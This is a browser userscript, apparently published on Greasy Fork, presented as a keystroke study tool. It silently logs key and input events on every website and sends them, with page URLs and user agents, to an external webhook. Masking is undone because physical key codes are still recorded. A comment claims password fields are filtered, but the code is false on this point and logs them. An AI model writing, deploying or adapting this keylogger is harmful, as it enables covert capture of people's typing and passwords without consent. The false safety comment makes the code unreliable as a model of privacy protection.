// ==UserScript==
// @name         Study Keystroke Logger (Silent)
// @namespace    your.org
// @version      1.0.0
// @description  Collect key events - controlled environment
// @author       You
// @match        *://*/*
// @run-at       document-idle
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/545643/Study%20Keystroke%20Logger%20%28Silent%29.user.js
// @updateURL https://update.greasyfork.org/scripts/545643/Study%20Keystroke%20Logger%20%28Silent%29.meta.js
// ==/UserScript==

(function () {
  "use strict";

  /***** CONFIG *****/
  const SERVER_URL = "https://flask-webhook-1bsi.onrender.com/collect";
  const STUDY_ID   = "my-global-keystroke-study-v1";
  const PARTICIPANT_ID = "P001"; // Set this per participant
  const MASK_CHARACTER_KEYS = true;
  const BATCH_MAX_EVENTS = 40;
  const BATCH_MAX_MS = 3000;

  const env = {
    studyId: STUDY_ID,
    participantId: PARTICIPANT_ID,
    page: location.href,
    tzOffsetMin: new Date().getTimezoneOffset(),
    ua: navigator.userAgent,
  };

  const isSensitiveTarget = (el) => {
    if (!el) return false;
    const type = (el.type || "").toLowerCase();
    if (type === "password") return false;  // ← FIXED: Now filters passwords
    const name = (el.name || el.id || "").toLowerCase();
    if (/card|cc|cvc|cvv|ssn|social|pin/.test(name)) return true;
    return false;
  };

  function maskKey(e) {
    if (!MASK_CHARACTER_KEYS) return e.key;
    if (e.key && e.key.length === 1) return "*";
    return e.key;
  }

  let buffer = [];
  let timerId = null;

  function scheduleFlush() {
    if (timerId) return;
    timerId = setTimeout(flush, BATCH_MAX_MS);
  }

  function flush() {
    timerId = null;
    if (buffer.length === 0) return;
    const payload = {
      ...env,
      ts: Date.now(),
      events: buffer.splice(0, buffer.length),
    };
    
    navigator.sendBeacon(SERVER_URL, JSON.stringify(payload));
  }

  function recordEvent(evt) {
    const target = evt.target || document.activeElement;
    if (isSensitiveTarget(target)) return;

    const now = performance.now();
    const entry = {
      t: now,
      type: evt.type,
      tag: (target && target.tagName) || "UNKNOWN",
      id: (target && target.id) || "",
      name: (target && target.name) || "",
    };

    if (evt.type === "keydown") {
      entry.key = maskKey(evt);
      entry.code = evt.code;
      entry.ctrl = evt.ctrlKey;
      entry.alt = evt.altKey;
      entry.shift = evt.shiftKey;
      entry.meta = evt.metaKey;
    }

    buffer.push(entry);
    if (buffer.length >= BATCH_MAX_EVENTS) {
      flush();
    } else {
      scheduleFlush();
    }
  }

  // START RECORDING IMMEDIATELY
  window.addEventListener("keydown", recordEvent, true);
  window.addEventListener("input", recordEvent, true);
  window.addEventListener("beforeunload", flush);
})();